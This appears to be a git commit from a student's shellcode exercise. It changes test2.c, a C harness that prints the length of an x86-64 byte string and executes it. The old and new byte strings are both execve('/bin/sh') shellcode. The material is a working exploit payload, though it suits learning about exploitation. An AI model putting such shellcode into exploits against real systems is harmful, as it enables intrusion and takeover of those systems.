1965d6f3213691b74a0a04d0177d712c2ff86c8d
Melody Liu <liu00401@umn.edu>
2020-10-23 17:13:21 -0500

    trying more

--- test2.c
+++ test2.c
@@ -1,11 +1,12 @@
 #include <stdio.h>
 #include <string.h>
 
-char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
-
+char shellcode[] = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69"
+                             "\x6e\x2f\x2f\x73\x68\x57\x48\x89"
+                             "\xe7\xb0\x3b\x0f\x05";
 int main()
 {
-    printf("len:%d bytes\n", strlen(code));
-    (*(void(*)()) code)();
+    printf("len:%d bytes\n", strlen(shellcode));
+    (*(void(*)()) shellcode)();
     return 0;
 }
